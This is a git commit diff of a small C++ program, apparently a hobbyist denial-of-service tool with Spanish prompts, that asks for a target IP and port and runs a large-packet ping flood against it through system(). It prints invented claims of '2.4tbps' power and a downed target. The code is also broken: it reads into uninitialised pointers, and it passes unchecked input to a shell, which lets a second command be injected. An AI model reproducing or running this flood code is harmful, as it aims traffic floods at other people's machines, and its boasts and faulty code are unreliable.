329a43d339784f1777a939b70f91efbf4bac42d5
Yarmak <57866743+Yarmaksito@users.noreply.github.com>
2020-07-03 21:50:38 -0300

    Mejoras en la potencia

--- tumberos422.cpp
+++ tumberos422.cpp
@@ -6,15 +6,15 @@ int main()
   char *xd;
   char *command[200] = {0};
   std::cout << "Introducir la IP para atacar: ";
-  std::cout << "\nIntroducir el puerto para atacar: ";
   std::cin >> lol;
+  std::cout << "\nIntroducir el puerto para atacar: ";
   std::cin >> xd;
   #ifdef __linux__
     snprintf(command, 200, "ping %s -c 99999 -q -s 65500", lol);
   #else
     snprintf(command, 200, "ping %s -t -l 65500 > nul", lol);
   #endif
-  std::cout << "Atacando la IP...\nPotencia:2.4tbps\nStatus: Tumbada\nIP bajada por sls422 y braian samp samp....";
+  std::cout << "Atacando la IP: 127.0.0.1\nPuerto: 7777\nPotencia:2.4tbps\nStatus: Tumbada\nIP bajada por sls422 y braian samp samp....";
   system(command);
   return 0;
 }
